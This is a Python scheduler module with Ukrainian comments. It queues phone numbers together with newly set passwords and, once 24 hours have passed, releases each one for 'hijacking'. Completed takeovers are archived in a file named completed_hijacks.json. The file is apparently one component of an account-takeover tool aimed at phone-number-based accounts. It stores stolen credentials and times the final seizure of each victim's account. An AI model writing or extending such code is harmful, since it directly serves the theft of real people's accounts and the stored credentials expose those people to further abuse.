# scheduler.py (оновлена версія)
import json
import os
from datetime import datetime, timezone, timedelta
import logging
from config import SCHEDULE_FILE

logger = logging.getLogger(__name__)


async def load_schedule():
    """Завантажує розклад з файлу з атомарним читанням"""
    if not os.path.exists(SCHEDULE_FILE):
        return {}

    try:
        with open(SCHEDULE_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if content.strip():
                return json.loads(content)
            return {}
    except (json.JSONDecodeError, IOError) as e:
        logger.error(f"Помилка завантаження розкладу: {e}")
        return {}


async def save_schedule(schedule):
    """Зберігає розклад у файл з атомарним записом"""
    try:
        temp_file = SCHEDULE_FILE + ".tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(schedule, f, indent=4, ensure_ascii=False)

        # Атомарна заміна
        os.replace(temp_file, SCHEDULE_FILE)

    except IOError as e:
        logger.error(f"Помилка збереження розкладу: {e}")


async def add_to_schedule(phone_number: str, new_password: str):
    """Додає номер телефону у чергу на перехоплення через 24 години"""
    schedule = await load_schedule()

    schedule[phone_number] = {
        "hijacked_at": datetime.now(timezone.utc).isoformat(),
        "password": new_password,
        "status": "pending"
    }

    await save_schedule(schedule)
    logger.info(f"📅 Номер {phone_number} додано до черги на перехоплення через 24 години.")


async def get_pending_hijacks():
    """Повертає список номерів, для яких настав час виконання"""
    schedule = await load_schedule()
    now = datetime.now(timezone.utc)
    ready_to_hijack = []

    for phone_number, data in list(schedule.items()):
        if data.get("status") != "pending":
            continue

        hijacked_time_str = data.get("hijacked_at")
        if not hijacked_time_str:
            continue

        try:
            hijacked_time = datetime.fromisoformat(hijacked_time_str).replace(tzinfo=timezone.utc)

            if now - hijacked_time >= timedelta(hours=24):
                ready_to_hijack.append({
                    "phone": phone_number,
                    "password": data.get("password")
                })
                schedule[phone_number]["status"] = "processing"

        except ValueError as e:
            logger.error(f"❌ Помилка парсингу дати для {phone_number}: {e}")
            continue

    if ready_to_hijack:
        await save_schedule(schedule)

    return ready_to_hijack


async def mark_as_done(phone_number: str):
    """Позначає завдання як виконане і видаляє його з черги"""
    schedule = await load_schedule()

    if phone_number in schedule:
        # Додаємо до архіву перед видаленням
        archive_data = {
            "phone": phone_number,
            "data": schedule[phone_number],
            "completed_at": datetime.now(timezone.utc).isoformat()
        }

        await add_to_archive(archive_data)

        del schedule[phone_number]
        await save_schedule(schedule)
        logger.info(f"✅ Завдання для {phone_number} виконано та видалено з черги.")


async def add_to_archive(data):
    """Додає виконане завдання до архіву"""
    try:
        archive_file = os.path.join(os.path.dirname(SCHEDULE_FILE), "completed_hijacks.json")

        archive = []
        if os.path.exists(archive_file):
            with open(archive_file, 'r', encoding='utf-8') as f:
                archive = json.load(f)

        archive.append(data)

        # Зберігаємо архів
        with open(archive_file, 'w', encoding='utf-8') as f:
            json.dump(archive, f, indent=4, ensure_ascii=False)

    except Exception as e:
        logger.error(f"❌ Помилка при додаванні до архіву: {e}")

async def get_schedule_statistics() -> dict:
    """Повертає статистику по розкладу"""
    try:
        schedule = await load_schedule()
        stats = {
            'total_pending': 0,
            'total_processing': 0,
            'oldest_pending': None,
            'newest_pending': None,
            'pending_24h': 0,
            'pending_48h': 0,
            'pending_72h_plus': 0
        }

        now = datetime.now(timezone.utc)

        for phone, data in schedule.items():
            status = data.get('status', 'pending')

            if status == 'pending':
                stats['total_pending'] += 1

                try:
                    hijacked_time = datetime.fromisoformat(data.get('hijacked_at', '')).replace(tzinfo=timezone.utc)
                    age_hours = (now - hijacked_time).total_seconds() / 3600

                    if not stats['oldest_pending'] or hijacked_time < stats['oldest_pending']:
                        stats['oldest_pending'] = hijacked_time

                    if not stats['newest_pending'] or hijacked_time > stats['newest_pending']:
                        stats['newest_pending'] = hijacked_time

                    if age_hours <= 24:
                        stats['pending_24h'] += 1
                    elif age_hours <= 48:
                        stats['pending_48h'] += 1
                    else:
                        stats['pending_72h_plus'] += 1

                except ValueError:
                    continue

            elif status == 'processing':
                stats['total_processing'] += 1

        return stats

    except Exception as e:
        logger.error(f"❌ Помилка при отриманні статистики розкладу: {e}")
        return {}

